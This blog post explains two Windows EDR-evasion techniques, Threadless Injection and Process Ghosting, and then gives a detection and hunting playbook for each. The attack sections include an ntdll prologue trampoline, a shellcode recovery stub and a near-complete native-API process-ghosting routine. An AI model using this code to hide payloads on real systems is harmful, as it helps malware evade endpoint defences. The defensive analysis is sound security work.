---
layout: attack
title: "Breaking the Thread & Spawning Ghosts: Threadless Injection and Process Ghosting"
---

<img height="150" align="left" src="/images/threadless-ghosting-logo.png"> The operational landscape of modern EDR agents has shifted far beyond simplistic userland API hooking. Today, defensive products orchestrate multi-layered telemetry matrices—correlating userland hooks with kernel callbacks (`ObRegisterCallbacks`, `PspCreateProcessNotifyRoutineEx`, `PspCreateThreadNotifyRoutine`), file system Mini-filters, and hardware-enforced logging via the **ETW Threat Intelligence** (ETW-TI) subsystem.

As documented across my [EDR Bypass Roadmap](https://benjitrapp.github.io/attacks/2026-01-18-%20EDR-bypass-roadmap/), navigating this paradigm demands process-manipulation primitives that do not emit signature behavioral alarms. While techniques such as [Early Bird APC Injection or Early Cascade Injection](https://benjitrapp.github.io/attacks/2026-01-19-early-bird-cascade/) intercept control flows during early-stage process initialization windows, they remain bound to visible thread-creation sequences or APC queue signals. This deep dive systematically deconstructs two highly advanced alternatives engineered to blind telemetry networks: **Threadless Injection** and **Process Ghosting** (Ghost Spawn).

- [Threadless Injection: Structural Analysis](#threadless-injection-structural-analysis)
  - [Why Threads Are the Problem](#why-threads-are-the-problem)
  - [The Execution Architecture](#the-execution-architecture)
  - [Deep-Dive Step Sequence & The Assembly Recovery Layer](#deep-dive-step-sequence--the-assembly-recovery-layer)
  - [Core Implementation Paradigm](#core-implementation-paradigm)
- [Process Ghosting (Ghost Spawn): Structural Analysis](#process-ghosting-ghost-spawn-structural-analysis)
  - [The File-System State Matrix](#the-file-system-state-matrix)
  - [Native API Execution Sequence](#native-api-execution-sequence)
  - [Why the EDR Goes Blind](#why-the-edr-goes-blind)
- [Telemetry Matrix & Detection Paradigms](#telemetry-matrix--detection-paradigms)
- [Hunting Playbook: How to Detect These Techniques Anyway](#hunting-playbook-how-to-detect-these-techniques-anyway)
  - [Detecting Threadless Injection](#detecting-threadless-injection)
  - [Detecting Process Ghosting](#detecting-process-ghosting)
  - [Summary Detection Matrix](#summary-detection-matrix)
- [References & Open-Source Research](#references--open-source-research)


## Threadless Injection: Structural Analysis

Traditional injection archetypes require creating explicit execution triggers. Calling higher-level routines or low-level native equivalents like `NtCreateThreadEx` instructs the Windows Kernel Scheduler to allocate a brand-new execution context. This interaction forces a registration path through the kernel thread notification framework—giving an EDR immediate visibility into structural characteristics like entry point locations and stack frame allocations.

**Threadless Injection** fundamentally bypasses this interaction model by creating no new threads. Instead, it behaves opportunistically: the injector mutates a pre-existing, heavily-traveled execution path inside a legitimate remote process by modifying a critical system function export. When a native, trusted thread inside that target process inherently executes that function as part of its normal operation, it triggers a trampoline—seamlessly jumping into the payload buffer without dispatching a system event notification.

### Why Threads Are the Problem

Every call to `NtCreateThreadEx` or `CreateRemoteThread` travels through the kernel thread notification framework (`PspCreateThreadNotifyRoutine`). EDR drivers register callbacks here, gaining immediate visibility into:

- The **entry point address** (is it inside a known module, or pointing at anonymous RWX memory?)
- The **call stack** at creation time
- The **owning process** context

By eliminating thread creation entirely, Threadless Injection removes the single loudest signal in the injection telemetry chain.

### The Execution Architecture

```
[ Host/Attacker Process ]
|
+===> 1. NtAllocateVirtualMemory()  --> Maps an anonymous RW payload staging buffer
+===> 2. NtWriteVirtualMemory()     --> Commits Shellcode + Assembly Recovery Stub
+===> 3. Remote Export Resolution    --> Parses PE Headers to target a high-frequency
|                                       system function (e.g., ntdll!TpReleaseWork,
|                                       ntdll!TppWorkerMain, ntdll!EtwEventWrite)
+===> 4. NtProtect/NtWriteVirtual() --> Replaces target export prologue with JMP sequence
|
v
[ Remote Target Process Environment ]
+------------------------------------------------------------+
| Legitimate Native Thread (Pool Worker / System Thread)     |
|   |                                                        |
|   v                                                        |
|   Routine Call to Targeted Export Function                  |
|   |                                                        |
|   +---> [ Intercepted by Trampoline Jump ]                 |
|         |                                                  |
|         v                                                  |
|         [ Assembly Recovery Stub + Shellcode Execution ]   |
|         |                                                  |
|         v                                                  |
|         [ Hot-Patch Restoration Routine ]                  |
|         |                                                  |
|         v                                                  |
|         Thread Gracefully Resumes Legitimate Native State  |
+------------------------------------------------------------+
```

### Deep-Dive Step Sequence & The Assembly Recovery Layer

To implement this architecture without corrupting the stability of the targeted thread, a precise execution routine must be observed:

**1. Staging Buffer Allocation:** The injector issues an `NtAllocateVirtualMemory` allocation targeting private memory in the remote space. Permissions start as `PAGE_READWRITE`. After the payload write, permissions transition via `NtProtectVirtualMemory` to `PAGE_EXECUTE_READ`—preventing discovery by memory scanners hunting for loose RWX markers.

**2. Payload Architecture Construction:** The payload cannot be raw shellcode alone. It must be wrapped inside an assembly-staged loader structure that:
- Preserves the initial thread register environment (`pushfq` + explicit register saves)
- Stores the target export's original prologue bytes
- Executes the malicious payload
- Hot-patches the export back to its factory-default state
- Returns cleanly to avoid access violations

**3. Inline Remote Hooking:** The injector patches the prologue of the target export (e.g., `ntdll!TppWorkerMain`). A standard 12-byte absolute jump sequence for x64 systems diverts execution:

```asm
; 12-Byte Absolute JMP Instruction Pattern for x64 Systems
mov rax, 0x1122334455667788   ; Target absolute payload buffer address
jmp rax                        ; Execute control transfer
```

> **Critical Engineering Requirement:** Once the trampoline diverts the target thread into the loader stub, the very first action must be an immediate register state serialization via `pushfq` (pushing RFLAGS to the stack) and explicit register pushing. Failure to isolate the environment will result in immediate thread crashes upon return.

### Core Implementation Paradigm

Below is a conceptualization of the tracking structures and recovery routines required within the loader execution block:

```cpp
#include <windows.h>

typedef struct _THREADLESS_EXECUTION_CONTEXT {
    PVOID   pTargetExportAddress;       // VA of the manipulated function (e.g., TppWorkerMain)
    BYTE    originalPrologueBytes[12];  // Saved factory-default byte configuration
    DWORD   payloadLength;              // Total length of raw shellcode payload
    BYTE    shellcodePayload[1];        // Staged shellcode reference point
} THREADLESS_CONTEXT, *PTHREADLESS_CONTEXT;
```

The assembly wrapper stub conceptually follows this pattern:

```asm
; === Threadless Injection Recovery Stub ===
pushfq                          ; Serialize CPU Status Register State
push r10
push r11
push rax                        ; Preserve essential calling registers

; [EXECUTE BASE SHELLCODE PAYLOAD]
lea rcx, [rip + offset_to_payload]
call execute_payload

; [HOT-PATCH RESTORATION]
; Write originalPrologueBytes back over pTargetExportAddress
; Requires internal NtProtectVirtualMemory call to toggle permissions
; This prevents infinite re-execution loops

pop rax
pop r11
pop r10                         ; Restore CPU Calling Registers
popfq                           ; Restore Status Registers

; [CONTEXT RE-ENTRY]
jmp [pTargetExportAddress]      ; Re-execute original system call path cleanly
```

The hot-patch restoration step is critical: without writing back the original prologue bytes, every subsequent call to the targeted export would re-trigger the shellcode, creating an infinite loop that quickly destabilizes the target process.


## Process Ghosting (Ghost Spawn): Structural Analysis

Modern endpoint defenses log process-creation metadata directly from kernel space using the `PspCreateProcessNotifyRoutineEx` register interface. The instant a new execution context is registered, an OS-level trigger alerts the EDR driver. The agent immediately references the physical file-path mapping back to disk storage—checking for digital signatures, scanning structural layout flags, or computing hash identifiers.

**Process Ghosting** subverts this verification workflow by creating a process from an image section backed by a temporary file that has already been structurally deleted from disk. Because the file is marked for deletion **prior to** image mapping, external validation lookups made by EDR services fail with explicit access errors—rendering them completely blind to the payload layout.

### The File-System State Matrix

To comprehend this technique, we need to understand how Windows manages file deletions. A file on an NTFS volume is not instantly purged when a deletion request is made. It is placed into a structural state designated as **Delete-Pending**. This transition happens when a file object handle is initialized with `DELETE` rights and modified via the `FileDispositionInformation` information class.

```
+--------------------+  1. NtCreateFile()
| File Created on    |========================> Handle opened with DELETE permissions
| Physical NTFS Disk |
+--------------------+
         |
         v               2. NtSetInformationFile()
+--------------------+
| Set Delete-Pending |========================> File state flag mutated to TRUE
+--------------------+
         |
         v               3. NtWriteFile()
+--------------------+
| Populate Payload   |========================> Malicious PE written into delete-pending file
+--------------------+
         |
         v               4. NtCreateSection(..., SEC_IMAGE, hFile)
+--------------------+
| Map Image Section  |========================> Kernel maps executable image into memory
+--------------------+
         |
         v               5. NtClose(hFile)
+--------------------+
| File Disappears    |========================> Disk entry completely unlinked and erased
+--------------------+      No on-disk file remains for inspection
         |
         v               6. NtCreateProcessEx()
+--------------------+
| Ghost Process Spawn|========================> Process generated from decoupled
+--------------------+      in-memory Section object
```

The ordering here is essential. The file must be placed into `Delete-Pending` state **before** the payload is written and the section is mapped. This ensures the kernel has already committed to destroying the file once the handle closes, but the section mapping keeps the in-memory image alive for process creation.

### Native API Execution Sequence

This technique cannot be orchestrated using traditional Win32 abstractions like `CreateProcess`. It demands precise synchronization of the Native API layer via `ntdll.dll`:

```cpp
NTSTATUS ExecuteProcessGhosting(PWSTR szTargetDiskPath, PBYTE pPayloadBuffer, DWORD dwPayloadSize) {
    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING usPath;

    // Step 1: Open a handle with DELETE permissions
    RtlInitUnicodeString(&usPath, szTargetDiskPath);
    InitializeObjectAttributes(&objAttr, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NtCreateFile(&hFile, GENERIC_READ | GENERIC_WRITE | DELETE,
                 &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0,
                 FILE_SUPERSEDE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    // Step 2: Transition file into Delete-Pending state
    FILE_DISPOSITION_INFORMATION fileDispose;
    fileDispose.DeleteFile = TRUE;
    NtSetInformationFile(hFile, &ioStatus, &fileDispose,
                         sizeof(fileDispose), FileDispositionInformation);

    // Step 3: Populate the payload into the delete-pending container
    NtWriteFile(hFile, NULL, NULL, NULL, &ioStatus,
                pPayloadBuffer, dwPayloadSize, NULL, NULL);

    // Step 4: Create an image section backed by the doomed file handle
    HANDLE hSection = NULL;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                    PAGE_READONLY, SEC_IMAGE, hFile);

    // Step 5: Close the file handle - the OS unlinks the path instantly
    // The physical file vanishes from the volume storage layer
    NtClose(hFile);

    // Step 6: Instantiate the Process from the decoupled memory section
    HANDLE hProcess = NULL;
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
                      NtCurrentProcess(),
                      PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
                      hSection, NULL, NULL, FALSE);

    // Step 7: Configure Process Parameters via RtlCreateProcessParametersEx,
    // assign environment variables, map initial thread context using
    // NtCreateThreadEx, and resume the target context.

    return STATUS_SUCCESS;
}
```

### Why the EDR Goes Blind

When the kernel alerts registered EDR agents via `PspCreateProcessNotifyRoutineEx`, defensive systems query the file system to parse the executable structure. Because the backing handle was closed, the file system has completely destroyed the physical allocation. Any attempt to verify the file path returns `STATUS_FILE_NOT_FOUND` or `STATUS_DELETE_PENDING`. The telemetry agent is effectively blinded during the critical validation phase.

This is fundamentally different from [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) ([T1055.012](https://attack.mitre.org/techniques/T1055/012/)), where the process image is replaced after creation. In Ghosting, the backing file never exists in a scannable state at process creation time. It also differs from **Process Doppelgänging** ([T1055.013](https://attack.mitre.org/techniques/T1055/013/)), which leverages NTFS transactions rather than delete-pending states—though both exploit the window between section mapping and file validation.

| Technique | File State at Process Creation | Kernel Notification Blind Spot |
|:---|:---|:---|
| Process Hollowing | Valid file on disk, image replaced post-creation | None—file is scannable |
| Process Doppelgänging | Transacted file (never committed to disk) | File invisible outside transaction |
| **Process Ghosting** | Delete-pending / unlinked from disk | File destroyed before EDR can scan |


## Telemetry Matrix & Detection Paradigms

To defend infrastructure effectively, engineering teams must recognize where defensive telemetry fails and how advanced behavior analysis can counter these strategies.

| Evasion Strategy | Telemetry Blind Spots | Detection Engineering Solutions |
|:---|:---|:---|
| **Threadless Injection** | Zero telemetry via `NtCreateThreadEx`. Completely evades APC scheduling monitors. Eliminates common cross-process creation triggers. | **ETW-TI:** Monitor `Microsoft-Windows-Threat-Intelligence` provider for anomalous remote allocations ([T1055](https://attack.mitre.org/techniques/T1055/)). **Behavioral Scanning:** Deploy continuous memory scanning for modified execution stubs—unexpected code changes in `ntdll` or `kernel32` function prologues. |
| **Process Ghosting** | File scanners receive access errors during process creation alerts. Minifilter telemetry fails to parse signature hashes. Circumvents basic executable integrity checks. | **Sequence Correlation:** Monitor for API sequences where `NtCreateSection` with `SEC_IMAGE` references a file handle marked for deletion. **Anomalous Mapping:** Alert on process creation events where the process block lacks a valid, scannable image file path on disk. |

> **Defense Recommendation:** Neither technique is invisible to a well-instrumented stack. The key is correlating signals across multiple telemetry layers—kernel callbacks, ETW-TI, minifilter events, and memory scanning—rather than relying on any single detection point. Projects like [EDR Telemetry](https://www.edr-telemetry.com/) help map which vendors cover which signals.


## Hunting Playbook: How to Detect These Techniques Anyway

Neither Threadless Injection nor Process Ghosting is truly undetectable. They are designed to evade *specific* telemetry layers—but a defense-in-depth approach that correlates signals across the stack can still catch them. Below is a practical detection engineering breakdown.

### Detecting Threadless Injection

**1. Export Integrity Monitoring (Code Tampering Detection)**

The most direct signal is the modification of `ntdll.dll` or `kernel32.dll` export prologues in a remote process. A periodic or event-driven scan comparing in-memory function prologues against their on-disk counterparts reveals the trampoline:

```cpp
// Conceptual: Compare in-memory ntdll export bytes against clean on-disk copy
BOOL DetectPrologueTampering(HANDLE hProcess, LPCSTR szExportName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    BYTE* pInMemory = (BYTE*)GetProcAddress(hNtdll, szExportName);

    // Load a clean reference copy from disk
    BYTE cleanBytes[16];
    ReadCleanNtdllBytes(szExportName, cleanBytes, sizeof(cleanBytes));

    BYTE remoteBytes[16];
    ReadProcessMemory(hProcess, pInMemory, remoteBytes, sizeof(remoteBytes), NULL);

    // A mismatch in the first 12 bytes strongly indicates inline hooking / trampoline
    return (memcmp(cleanBytes, remoteBytes, 12) != 0);
}
```

Tools like [pe-sieve](https://github.com/hasherezade/pe-sieve) and [Moneta](https://github.com/forrest-orr/moneta) automate this class of detection by scanning all loaded modules for code modifications.

**2. ETW Threat Intelligence Provider**

The `Microsoft-Windows-Threat-Intelligence` ETW provider (ETW-TI) is a kernel-level telemetry source that logs cross-process memory operations even when no thread creation occurs. Key events to monitor:

| ETW-TI Event | What It Catches |
|:---|:---|
| `KERNEL_THREATINT_TASK_ALLOCVM` | Remote `NtAllocateVirtualMemory` calls into another process |
| `KERNEL_THREATINT_TASK_PROTECTVM` | Permission transitions (RW -> RX) on remote memory |
| `KERNEL_THREATINT_TASK_WRITEVM` | Cross-process `NtWriteVirtualMemory` operations |

A Threadless Injection sequence produces all three events in rapid succession targeting the same remote PID—a pattern that legitimate software rarely exhibits.

**3. Anomalous Memory Region Characteristics**

Even after the RW -> RX permission flip, the allocated buffer stands out:
- It is **private, unbacked memory** (not mapped to any file on disk)
- It contains **executable code** outside of any known module range
- It often sits in an unusual address range relative to the process's normal memory layout

Memory scanning tools and EDR agents that enumerate `VAD` (Virtual Address Descriptor) trees can flag executable private regions that do not correspond to loaded images.

**4. Call Stack Anomaly Detection**

When the hijacked thread eventually executes the payload, its call stack contains frames that do not belong to any loaded module. Modern EDRs performing **stack walking** on sensitive API calls (e.g., `NtProtectVirtualMemory` called from within the recovery stub) can detect return addresses pointing into unbacked executable memory.

### Detecting Process Ghosting

**1. Minifilter Pre-Create and Cleanup Callbacks**

File system minifilter drivers receive callbacks at multiple stages of file lifecycle. A detection driver can correlate:
- `IRP_MJ_CREATE` with `DELETE` access → file opened with deletion intent
- `IRP_MJ_WRITE` → payload written to a delete-pending file
- `IRP_MJ_CLEANUP` → file handle closed, triggering final deletion

If a `SEC_IMAGE` section mapping occurs between the delete-pending transition and the cleanup, the minifilter has a narrow but viable window to extract and scan the file contents before deletion completes.

**2. Process Creation Without Valid Backing File**

The strongest post-creation signal: when `PspCreateProcessNotifyRoutineEx` fires and the EDR attempts to open the backing image file, it receives `STATUS_FILE_NOT_FOUND` or `STATUS_DELETE_PENDING`. This is an inherently suspicious condition:

```
IF ProcessCreateNotification.ImageFileName == NULL
   OR OpenFile(ImageFileName) == STATUS_FILE_NOT_FOUND
   OR OpenFile(ImageFileName) == STATUS_DELETE_PENDING
THEN
   FLAG as potential Process Ghosting / Doppelgänging
```

Elastic's own detection logic in [Elastic Defend](https://www.elastic.co/guide/en/security/current/process-ghosting.html) implements precisely this heuristic.

**3. NtCreateSection + SEC_IMAGE on Delete-Pending Files**

A kernel driver monitoring `NtCreateSection` calls can inspect the file object's state. If the `FILE_OBJECT` has its `DeletePending` flag set at the time a `SEC_IMAGE` section is created, this is a near-definitive indicator:

| Signal | Confidence | Notes |
|:---|:---|:---|
| `NtCreateSection(SEC_IMAGE)` on delete-pending file | **High** | Almost no legitimate software does this |
| Process creation with missing backing file | **High** | Can also be triggered by Doppelgänging |
| `NtCreateFile` with `DELETE` + `GENERIC_WRITE` + `FILE_SUPERSEDE` | **Medium** | Legitimate installers may produce this pattern |
| Rapid `Create → DeletePending → Write → Section → Close` sequence | **High** | Temporal correlation is key |

**4. YARA and Memory Forensics**

For incident response, memory forensics tools like [Volatility](https://github.com/volatilityfoundation/volatility3) can identify ghosted processes by examining the `_EPROCESS` structure: the `ImageFilePointer` field will reference a section object whose backing file no longer exists on disk. Custom YARA rules scanning process memory for known payload signatures remain effective since the code must eventually reside in executable memory regardless of how it got there.

### Summary Detection Matrix

| Detection Layer | Threadless Injection | Process Ghosting |
|:---|:---|:---|
| **Kernel Thread Callbacks** | No signal (no thread created) | N/A |
| **ETW-TI (Remote Memory Ops)** | Strong signal | Weak signal |
| **File System Minifilters** | N/A | Strong signal (delete-pending + section mapping) |
| **Process Create Callbacks** | N/A | Strong signal (missing backing file) |
| **Memory Scanning / VAD Analysis** | Strong signal (unbacked RX regions) | Moderate signal (valid section, but no file) |
| **Call Stack Analysis** | Strong signal (frames in unbacked memory) | Weak signal |
| **Code Integrity / Export Monitoring** | Strong signal (modified prologues) | N/A |

> **Key Takeaway:** No single telemetry source catches both techniques. The defensive advantage lies in **cross-layer correlation**—combining ETW-TI events with memory scanning, minifilter callbacks with process creation anomalies, and export integrity checks with call stack validation. Organizations should audit their EDR's coverage using the [EDR Telemetry Project](https://www.edr-telemetry.com/) and fill gaps with custom detection rules where needed.


## References & Open-Source Research

- **Threadless Injection:** [CCob's ThreadlessInject PoC](https://github.com/CCob/ThreadlessInject) — the original proof-of-concept implementation
- **Process Ghosting:** [Gabriel Landau / Elastic — Process Ghosting Research](https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack) and [hasherezade's PoC](https://github.com/hasherezade/process_ghosting)
- **Process Doppelgänging:** [Tal Liberman & Eugene Kogan — Black Hat Europe 2017](https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf)
- **MITRE ATT&CK:** [T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/), [T1055.012 — Process Hollowing](https://attack.mitre.org/techniques/T1055/012/), [T1055.013 — Process Doppelgänging](https://attack.mitre.org/techniques/T1055/013/)
- **Telemetry Tracking:** [EDR Telemetry Tracker Project](https://www.edr-telemetry.com/)
- **Related Posts:** [EDR Bypass Roadmap](https://benjitrapp.github.io/attacks/2026-01-18-%20EDR-bypass-roadmap/) | [Early Bird & Early Cascade Injection](https://benjitrapp.github.io/attacks/2026-01-19-early-bird-cascade/) | [Hell's Gate, Heaven's Gate & Tartarus Gate](https://benjitrapp.github.io/attacks/2026-01-19-hells-heaven-tartarus-gate/) | [Windows API Attack Surfaces](https://benjitrapp.github.io/attacks/2024-06-07-red-windows-api/) | [ETW Internals](https://benjitrapp.github.io/defenses/2024-02-11-etw/)
